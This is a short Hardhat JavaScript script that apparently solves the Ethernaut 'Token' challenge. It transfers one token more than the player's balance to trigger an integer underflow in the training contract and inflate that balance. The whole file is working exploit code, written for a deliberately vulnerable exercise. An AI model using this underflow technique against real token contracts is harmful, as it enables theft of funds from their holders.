const { ethers } = require("hardhat")

const tokenInstanceAddress = "0x922e11bCc7827039195004195F9BE8229EFBfC5f"

async function main() {
  /* Get signer */

  const accounts = await ethers.getSigners()
  const deployer = accounts[0]

  /* Get Token contract */

  console.log("Connecting to your instance of Token contract...")
  const token = await ethers.getContractAt("Token", tokenInstanceAddress, deployer)

  /* Running the attack and logging to console */

  const startingPlayerBalance = await token.balanceOf(deployer.address)
  console.log("Starting Player Balance:" + ethers.utils.formatEther(startingPlayerBalance))

  console.log("Transfering 21 tokens (1 above maximum 'allowed')...")
  const attackTx = await token.transfer(tokenInstanceAddress, 21)
  await attackTx.wait(1)

  const endingPlayerBalance = await token.balanceOf(deployer.address)
  console.log("Ending Player Balance:" + ethers.utils.formatEther(endingPlayerBalance))

  console.log("Pwned!")
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
